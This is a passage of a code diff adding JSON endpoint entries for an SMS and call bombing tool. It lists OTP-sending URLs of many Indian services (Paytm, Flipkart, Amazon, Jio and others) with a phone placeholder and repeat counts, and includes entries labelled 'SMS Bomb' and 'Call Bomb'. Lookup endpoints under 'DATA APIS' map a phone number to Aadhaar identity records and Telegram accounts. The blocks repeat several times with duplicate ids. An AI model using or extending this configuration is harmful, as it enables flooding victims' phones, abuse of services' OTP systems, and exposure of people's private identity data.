+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
